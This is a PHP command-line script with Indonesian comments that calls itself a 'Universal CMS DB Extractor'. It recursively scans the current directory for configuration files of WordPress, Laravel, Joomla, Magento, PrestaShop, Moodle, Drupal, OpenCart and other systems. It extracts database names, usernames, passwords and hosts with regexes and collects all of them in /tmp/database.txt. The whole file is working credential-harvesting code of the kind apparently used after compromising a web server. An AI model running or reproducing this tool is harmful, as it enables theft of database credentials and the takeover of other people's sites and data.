#!/usr/bin/php
<?php
// Universal CMS DB Extractor - PHP Version
// Modified to scan from current directory with support for more CMS

$baseDir = getcwd(); // Menggunakan direktori saat ini
$outputFile = "/tmp/database.txt";
file_put_contents($outputFile, "");

echo "[*] Scanning CMS config files di: $baseDir ...\n";
echo "[*] Mencari file konfigurasi database...\n\n";

$pattern = '/(' . implode('|', [
    'wp-config\.php',
    '\.env',
    'config\.inc\.php',
    'configuration\.php',
    'config\.php',
    'parameters\.php',
    'settings\.inc\.php',
    'env\.php',
    'local\.xml',
    'database\.php',
    'databases\.php',
    'db\.php',
    'connection\.php',
    'constants\.php',
    'config\.yml',
    'config\.yaml',
    'application\.php'
]) . ')$/';

$iterator = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS)
);

foreach ($iterator as $file) {
    if ($file->isFile() && preg_match($pattern, $file->getFilename())) {
        $filePath = $file->getPathname();
        $filename = $file->getFilename();
        $content = file_get_contents($filePath);
        
        $cms = "Unknown";
        $dbName = $dbUser = $dbPass = $dbHost = $dbPrefix = "";
        
        // Deteksi CMS berdasarkan konten dan nama file
        if (strpos($filePath, 'codeigniter') !== false || strpos($content, 'CodeIgniter') !== false) {
            $cms = "CodeIgniter";
        }
        
        switch ($filename) {
            case "wp-config.php":
                $cms = "WordPress";
                if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbHost = $match[1];
                if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPrefix = $match[1];
                break;
                
            case ".env":
                // Laravel, CodeIgniter 4, dll
                if (strpos($content, 'LARAVEL') !== false || strpos($content, 'laravel') !== false) {
                    $cms = "Laravel";
                } elseif (strpos($content, 'CODEIGNITER') !== false || strpos($content, 'codeigniter') !== false) {
                    $cms = "CodeIgniter 4";
                } else {
                    $cms = "Generic .env";
                }
                
                if (preg_match("/^DB_DATABASE=(.*)$/m", $content, $match)) $dbName = trim($match[1]);
                if (preg_match("/^DB_USERNAME=(.*)$/m", $content, $match)) $dbUser = trim($match[1]);
                if (preg_match("/^DB_PASSWORD=(.*)$/m", $content, $match)) $dbPass = trim($match[1]);
                if (preg_match("/^DB_HOST=(.*)$/m", $content, $match)) $dbHost = trim($match[1]);
                
                // CodeIgniter 4 format
                if (empty($dbName) && preg_match("/^database\.default\.database=(.*)$/m", $content, $match)) $dbName = trim($match[1]);
                if (empty($dbUser) && preg_match("/^database\.default\.username=(.*)$/m", $content, $match)) $dbUser = trim($match[1]);
                if (empty($dbPass) && preg_match("/^database\.default\.password=(.*)$/m", $content, $match)) $dbPass = trim($match[1]);
                if (empty($dbHost) && preg_match("/^database\.default\.hostname=(.*)$/m", $content, $match)) $dbHost = trim($match[1]);
                break;
                
            case "config.inc.php":
                $cms = "OJS / Generic";
                if (preg_match("/db_name\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/db_username\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/db_password\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/db_host\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbHost = $match[1];
                break;
                
            case "configuration.php":
                $cms = "Joomla";
                if (preg_match("/public\s+\$db\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/public\s+\$user\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/public\s+\$password\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/public\s+\$host\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbHost = $match[1];
                if (preg_match("/public\s+\$dbprefix\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPrefix = $match[1];
                break;
                
            case "parameters.php":
            case "settings.inc.php":
                $cms = "PrestaShop";
                if (preg_match("/define\s*\(\s*['\"]_DB_NAME_['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/define\s*\(\s*['\"]_DB_USER_['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/define\s*\(\s*['\"]_DB_PASSWD_['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/define\s*\(\s*['\"]_DB_SERVER_['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbHost = $match[1];
                if (preg_match("/define\s*\(\s*['\"]_DB_PREFIX_['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbPrefix = $match[1];
                break;
                
            case "database.php":
                // CodeIgniter 3, Laravel lama, dll
                if (strpos($content, 'CodeIgniter') !== false || strpos($content, 'codeigniter') !== false) {
                    $cms = "CodeIgniter 3";
                    
                    // CodeIgniter 3 database config
                    if (preg_match("/\\\$db\['default'\]\['database'\]\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbName = $match[1];
                    if (preg_match("/\\\$db\['default'\]\['username'\]\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbUser = $match[1];
                    if (preg_match("/\\\$db\['default'\]\['password'\]\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPass = $match[1];
                    if (preg_match("/\\\$db\['default'\]\['hostname'\]\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbHost = $match[1];
                    if (preg_match("/\\\$db\['default'\]\['dbprefix'\]\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPrefix = $match[1];
                } elseif (strpos($content, 'Laravel') !== false) {
                    $cms = "Laravel (old)";
                    if (preg_match("/'database'\s*=>\s*'([^']+)'/i", $content, $match)) $dbName = $match[1];
                    if (preg_match("/'username'\s*=>\s*'([^']+)'/i", $content, $match)) $dbUser = $match[1];
                    if (preg_match("/'password'\s*=>\s*'([^']+)'/i", $content, $match)) $dbPass = $match[1];
                    if (preg_match("/'host'\s*=>\s*'([^']+)'/i", $content, $match)) $dbHost = $match[1];
                }
                break;
                
            case "config.php":
                // Moodle, Drupal, dll
                if (preg_match("/moodle/i", $content) && preg_match("/dbuser/i", $content)) {
                    $cms = "Moodle";
                    if (preg_match("/\\\$CFG->dbname\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbName = $match[1];
                    if (preg_match("/\\\$CFG->dbuser\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbUser = $match[1];
                    if (preg_match("/\\\$CFG->dbpass\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPass = $match[1];
                    if (preg_match("/\\\$CFG->dbhost\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbHost = $match[1];
                } elseif (preg_match("/drupal/i", $content) || strpos($filePath, 'drupal') !== false) {
                    $cms = "Drupal";
                    if (preg_match("/'database'\s*=>\s*'([^']+)'/i", $content, $match)) $dbName = $match[1];
                    if (preg_match("/'username'\s*=>\s*'([^']+)'/i", $content, $match)) $dbUser = $match[1];
                    if (preg_match("/'password'\s*=>\s*'([^']+)'/i", $content, $match)) $dbPass = $match[1];
                    if (preg_match("/'host'\s*=>\s*'([^']+)'/i", $content, $match)) $dbHost = $match[1];
                    if (preg_match("/'prefix'\s*=>\s*'([^']+)'/i", $content, $match)) $dbPrefix = $match[1];
                }
                break;
                
            case "local.xml":
                $cms = "Magento 1";
                $xml = simplexml_load_string($content);
                if ($xml) {
                    if (isset($xml->global->resources->default_setup->connection->database)) 
                        $dbName = (string)$xml->global->resources->default_setup->connection->database;
                    if (isset($xml->global->resources->default_setup->connection->username)) 
                        $dbUser = (string)$xml->global->resources->default_setup->connection->username;
                    if (isset($xml->global->resources->default_setup->connection->password)) 
                        $dbPass = (string)$xml->global->resources->default_setup->connection->password;
                    if (isset($xml->global->resources->default_setup->connection->host)) 
                        $dbHost = (string)$xml->global->resources->default_setup->connection->host;
                    if (isset($xml->global->resources->default_setup->connection->table_prefix)) 
                        $dbPrefix = (string)$xml->global->resources->default_setup->connection->table_prefix;
                }
                break;
                
            case "env.php":
                $cms = "Magento 2";
                if (file_exists($filePath)) {
                    $config = include $filePath;
                    if (isset($config['db']['connection']['default']['dbname'])) 
                        $dbName = $config['db']['connection']['default']['dbname'];
                    if (isset($config['db']['connection']['default']['username'])) 
                        $dbUser = $config['db']['connection']['default']['username'];
                    if (isset($config['db']['connection']['default']['password'])) 
                        $dbPass = $config['db']['connection']['default']['password'];
                    if (isset($config['db']['connection']['default']['host'])) 
                        $dbHost = $config['db']['connection']['default']['host'];
                }
                break;
                
            case "config.yml":
            case "config.yaml":
                $cms = "Symfony / Drupal 8+";
                if (preg_match("/database:\s*([^\n]+)/i", $content, $match)) $dbName = trim($match[1]);
                if (preg_match("/username:\s*([^\n]+)/i", $content, $match)) $dbUser = trim($match[1]);
                if (preg_match("/password:\s*([^\n]+)/i", $content, $match)) $dbPass = trim($match[1]);
                if (preg_match("/host:\s*([^\n]+)/i", $content, $match)) $dbHost = trim($match[1]);
                break;
                
            case "application.php":
                $cms = "Laravel (config)";
                if (preg_match("/'database'\s*=>\s*'([^']+)'/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/'username'\s*=>\s*'([^']+)'/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/'password'\s*=>\s*'([^']+)'/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/'host'\s*=>\s*'([^']+)'/i", $content, $match)) $dbHost = $match[1];
                break;
                
            case "constants.php":
                $cms = "OpenCart / Lainnya";
                if (preg_match("/define\s*\(\s*['\"]DB_DATABASE['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/define\s*\(\s*['\"]DB_USERNAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/define\s*\(\s*['\"]DB_HOSTNAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbHost = $match[1];
                if (preg_match("/define\s*\(\s*['\"]DB_PREFIX['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $content, $match)) $dbPrefix = $match[1];
                break;
                
            case "db.php":
            case "connection.php":
                $cms = "Generic PHP";
                if (preg_match("/['\"]database['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbName = $match[1];
                if (preg_match("/['\"]username['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbUser = $match[1];
                if (preg_match("/['\"]password['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPass = $match[1];
                if (preg_match("/['\"]host['\"]\s*=>\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbHost = $match[1];
                break;
        }
        
        // Deteksi tambahan untuk CodeIgniter berdasarkan path
        if ($cms == "Unknown" && strpos($filePath, 'codeigniter') !== false) {
            $cms = "CodeIgniter (detected by path)";
            
            // Coba ekstrak dari berbagai format CodeIgniter
            if (empty($dbName) && preg_match("/\\\$db\['default'\]\['database'\]\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbName = $match[1];
            if (empty($dbUser) && preg_match("/\\\$db\['default'\]\['username'\]\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbUser = $match[1];
            if (empty($dbPass) && preg_match("/\\\$db\['default'\]\['password'\]\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPass = $match[1];
            if (empty($dbHost) && preg_match("/\\\$db\['default'\]\['hostname'\]\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbHost = $match[1];
            if (empty($dbPrefix) && preg_match("/\\\$db\['default'\]\['dbprefix'\]\s*=\s*['\"]([^'\"]+)['\"]/i", $content, $match)) $dbPrefix = $match[1];
        }
        
        if (!empty($dbName) && !empty($dbUser)) {
            $output = "[CMS: $cms]\n";
            $output .= "File       : $filename\n";
            $output .= "Path       : $filePath\n";
            $output .= "DB_NAME    : $dbName\n";
            $output .= "DB_USER    : $dbUser\n";
            $output .= "DB_PASSWORD: $dbPass\n";
            $output .= "DB_HOST    : $dbHost\n";
            if (!empty($dbPrefix)) $output .= "DB_PREFIX  : $dbPrefix\n";
            $output .= str_repeat("-", 50) . "\n\n";
            
            file_put_contents($outputFile, $output, FILE_APPEND);
            echo "  Found: $cms - $filename\n";
        }
    }
}

echo "\n[+] Selesai. Hasil valid disimpan di file: $outputFile\n";
echo "[+] Total file konfigurasi database yang ditemukan: " . substr_count(file_get_contents($outputFile), "[CMS:") . "\n";
?>
